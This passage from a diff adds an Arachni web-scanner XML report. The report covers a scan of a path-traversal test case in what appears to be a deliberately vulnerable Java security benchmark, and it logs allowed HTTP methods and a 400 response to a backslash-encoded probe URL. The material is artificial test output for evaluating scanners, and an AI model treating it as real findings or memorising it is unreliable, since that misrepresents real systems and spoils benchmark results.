+      <trusted>true</trusted>
+      <platform_type>os</platform_type>
+      <platform_name>unix</platform_name>
+    </issue>
+    <issue>
+      <name>Allowed HTTP methods</name>
+      <description>
+There are a number of HTTP methods that can be used on a webserver (`OPTIONS`,
+`HEAD`, `GET`, `POST`, `PUT`, `DELETE` etc.).  Each of these methods perform a
+different function and each have an associated level of risk when their use is
+permitted on the webserver.
+
+A client can use the `OPTIONS` method within a request to query a server to
+determine which methods are allowed.
+
+Cyber-criminals will almost always perform this simple test as it will give a
+very quick indication of any high-risk methods being permitted by the server.
+
+Arachni discovered that several methods are supported by the server.
+</description>
+      <remedy_guidance>
+It is recommended that a whitelisting approach be taken to explicitly permit the
+HTTP methods required by the application and block all others.
+
+Typically the only HTTP methods required for most applications are `GET` and
+`POST`. All other methods perform actions that are rarely required or perform
+actions that are inherently risky.
+
+These risky methods (such as `PUT`, `DELETE`, etc) should be protected by strict
+limitations, such as ensuring that the channel is secure (SSL/TLS enabled) and
+only authorised and trusted clients are permitted to use them.
+</remedy_guidance>
+      <remedy_code/>
+      <severity>informational</severity>
+      <check>
+        <name>Allowed methods</name>
+        <description>Checks for supported HTTP methods.</description>
+        <author>Tasos "Zapotek" Laskos &lt;tasos.laskos@arachni-scanner.com&gt;</author>
+        <version>0.2</version>
+        <shortname>allowed_methods</shortname>
+      </check>
+      <digest>3132382482</digest>
+      <references>
+        <reference title="Apache.org" url="http://httpd.apache.org/docs/2.2/mod/core.html#limitexcept"/>
+      </references>
+      <vector>
+        <class>Arachni::Element::Server</class>
+        <type>server</type>
+        <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+        <action>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</action>
+      </vector>
+      <remarks/>
+      <page>
+        <body/>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <method>options</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="b0e3e4422d66983deb98ca68d786ace8"/>
+          </headers>
+          <body/>
+          <raw>OPTIONS /benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: b0e3e4422d66983deb98ca68d786ace8&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0052</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Allow" value="GET, HEAD, POST, OPTIONS"/>
+            <header name="Content-Length" value="0"/>
+            <header name="Date" value="Thu, 29 May 2025 10:13:56 GMT"/>
+          </headers>
+          <body/>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Allow: GET, HEAD, POST, OPTIONS&#xD;
+Content-Length: 0&#xD;
+Date: Thu, 29 May 2025 10:13:56 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </page>
+      <referring_page>
+        <body>The beginning of file: '&amp;#x2f;home&amp;#x2f;huy&amp;#x2f;BenchmarkJava&amp;#x2f;target&amp;#x2f;tomcat9x&amp;#x2f;testfiles&amp;#x2f;FileName' is:
+
+
+Problem getting InputStream: offset 0, count -1, length 1000
+</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <method>get</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="b0e3e4422d66983deb98ca68d786ace8"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: b0e3e4422d66983deb98ca68d786ace8&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0272</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Content-Type" value="text/html;charset=UTF-8"/>
+            <header name="Content-Length" value="186"/>
+            <header name="Date" value="Thu, 29 May 2025 10:13:54 GMT"/>
+          </headers>
+          <body>The beginning of file: '&amp;#x2f;home&amp;#x2f;huy&amp;#x2f;BenchmarkJava&amp;#x2f;target&amp;#x2f;tomcat9x&amp;#x2f;testfiles&amp;#x2f;FileName' is:
+
+
+Problem getting InputStream: offset 0, count -1, length 1000
+</body>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Content-Type: text/html;charset=UTF-8&#xD;
+Content-Length: 186&#xD;
+Date: Thu, 29 May 2025 10:13:54 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </referring_page>
+      <signature/>
+      <proof>GET, HEAD, POST, OPTIONS</proof>
+      <trusted>true</trusted>
+      <platform_type/>
+      <platform_name/>
+    </issue>
+    <issue>
+      <name>Interesting response</name>
+      <description>
+The server responded with a non 200 (OK) nor 404 (Not Found) status code.
+This is a non-issue, however exotic HTTP response status codes can provide useful
+insights into the behavior of the web application and assist with the penetration test.
+</description>
+      <remedy_guidance/>
+      <remedy_code/>
+      <severity>informational</severity>
+      <check>
+        <name>Interesting responses</name>
+        <description>Logs all non 200 (OK) server responses.</description>
+        <author>Tasos "Zapotek" Laskos &lt;tasos.laskos@arachni-scanner.com&gt;</author>
+        <version>0.2.1</version>
+        <shortname>interesting_responses</shortname>
+      </check>
+      <digest>3793149690</digest>
+      <references>
+        <reference title="w3.org" url="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html"/>
+      </references>
+      <vector>
+        <class>Arachni::Element::Server</class>
+        <type>server</type>
+        <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629/%5C.b0e3e4422d66983deb98ca68d786ace8%5C</url>
+        <action>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629/%5C.b0e3e4422d66983deb98ca68d786ace8%5C</action>
+      </vector>
+      <remarks/>
+      <page>
+        <body>&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 &#x2013; Bad Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 &#x2013; Bad Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid URI&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/9.0.97&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629/%5C.b0e3e4422d66983deb98ca68d786ace8%5C</url>
+          <method>get</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="b0e3e4422d66983deb98ca68d786ace8"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/pathtraver-00/BenchmarkTest00629/%5C.b0e3e4422d66983deb98ca68d786ace8%5C HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: b0e3e4422d66983deb98ca68d786ace8&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629/%5C.b0e3e4422d66983deb98ca68d786ace8%5C</url>
+          <code>400</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0015</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Type" value="text/html;charset=utf-8"/>
+            <header name="Content-Language" value="en"/>
+            <header name="Content-Length" value="795"/>
+            <header name="Date" value="Thu, 29 May 2025 10:13:56 GMT"/>
+            <header name="Connection" value="close"/>
+          </headers>
+          <body>&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 &#x2013; Bad Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 &#x2013; Bad Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid URI&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/9.0.97&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</body>
+          <raw_headers>HTTP/1.1 400 &#xD;
+Content-Type: text/html;charset=utf-8&#xD;
+Content-Language: en&#xD;
+Content-Length: 795&#xD;
+Date: Thu, 29 May 2025 10:13:56 GMT&#xD;
+Connection: close&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629/%5C.b0e3e4422d66983deb98ca68d786ace8%5C</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </page>
+      <referring_page>
+        <body>The beginning of file: '&amp;#x2f;home&amp;#x2f;huy&amp;#x2f;BenchmarkJava&amp;#x2f;target&amp;#x2f;tomcat9x&amp;#x2f;testfiles&amp;#x2f;FileName' is:
+
+
+Problem getting InputStream: offset 0, count -1, length 1000
+</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <method>get</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="b0e3e4422d66983deb98ca68d786ace8"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: b0e3e4422d66983deb98ca68d786ace8&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0272</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Content-Type" value="text/html;charset=UTF-8"/>
+            <header name="Content-Length" value="186"/>
+            <header name="Date" value="Thu, 29 May 2025 10:13:54 GMT"/>
+          </headers>
+          <body>The beginning of file: '&amp;#x2f;home&amp;#x2f;huy&amp;#x2f;BenchmarkJava&amp;#x2f;target&amp;#x2f;tomcat9x&amp;#x2f;testfiles&amp;#x2f;FileName' is:
+
+
+Problem getting InputStream: offset 0, count -1, length 1000
+</body>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Content-Type: text/html;charset=UTF-8&#xD;
+Content-Length: 186&#xD;
+Date: Thu, 29 May 2025 10:13:54 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </referring_page>
+      <signature/>
+      <proof>HTTP/1.1 400 </proof>
+      <trusted>true</trusted>
+      <platform_type/>
+      <platform_name/>
+    </issue>
+  </issues>
+  <plugins>
+    <healthmap>
+      <name>Health map</name>
+      <description>Generates a simple list of safe/unsafe URLs.</description>
+      <results>
+        <map>
+          <with_issues>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629</with_issues>
+          <with_issues>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629/%5C.b0e3e4422d66983deb98ca68d786ace8%5C</with_issues>
+          <with_issues>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</with_issues>
+        </map>
+        <total>3</total>
+        <with_issues>3</with_issues>
+        <without_issues>0</without_issues>
+        <issue_percentage>100</issue_percentage>
+      </results>
+    </healthmap>
+  </plugins>
+</report>
